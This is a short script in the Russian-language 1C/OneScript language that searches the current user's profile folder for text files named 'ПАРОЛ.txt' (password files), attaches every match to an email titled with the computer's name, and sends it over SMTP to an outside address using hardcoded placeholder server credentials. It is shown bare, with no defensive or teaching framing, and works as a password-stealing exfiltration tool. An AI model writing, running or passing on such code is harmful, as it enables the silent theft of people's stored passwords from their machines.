// #Использовать InternetMail

//ПодключениеИнтернетПочты = Новый ПодключениеИнтернетПочты;
//ПодключениеИнтернетПочты.Подключить();

//МенеджерЗапакованныхФайлов = Новый МенеджерЗапакованныхФайлов;
УстановитьТекущийКаталог("/tmp/.InternetMail/1_0_4/");
//ПодключитьВнешнююКомпоненту("/tmp/.InternetMail/1_0_4/MailComponent.dll");

ПодключитьВнешнююКомпоненту("./bin/MailComponent.dll");


ИмяКомпьютера = ПолучитьПеременнуюСреды("COMPUTERNAME");
КаталогПрофиляПользователя = ПолучитьПеременнуюСреды("USERPROFILE");

Профиль = Новый ИнтернетПочтовыйПрофиль;

Профиль.АдресСервераSMTP = "mail.server.com";
Профиль.ПользовательSMTP = "1c@server.com";
Профиль.ПарольSMTP = "password";
Профиль.ИспользоватьSSLSMTP = Ложь;

Профиль.АдресСервераPOP3 = "mail.server.com";
Профиль.ИспользоватьSSLPOP3 = Ложь;
Профиль.Пользователь = "1c@server.com";
Профиль.Пароль = "password";

Сообщение = Новый ИнтернетПочтовоеСообщение;
Сообщение.Получатели.Добавить("adressee@server.com");
Сообщение.Отправитель = "1c@server.com";
Сообщение.Тема = ИмяКомпьютера ;//+ " на " + Строка(ТекущаяДата());

Текст = "Файлы с компьютера " + ИмяКомпьютера;

Сообщение.Тексты.Добавить(Текст, ТипТекстаПочтовогоСообщения.HTML);

МассивТекстовыхФайловПАРОЛЬ = НайтиФайлы(КаталогПрофиляПользователя, "ПАРОЛ.txt", Истина);
Для Каждого ФайлПароль из МассивТекстовыхФайловПАРОЛЬ Цикл
Сообщение.Вложения.Добавить(
Новый ДвоичныеДанные(ФайлПароль.Путь + ФайлПароль.Имя),
ФайлПароль.Имя);
КонецЦикла;

Если Сообщение.Вложения.Количество() > 0 Тогда
Почта = Новый ИнтернетПочта;
Почта.Подключиться(Профиль, ПротоколИнтернетПочты.POP3);
Почта.Послать(Сообщение, , ПротоколИнтернетПочты.SMTP);
КонецЕсли;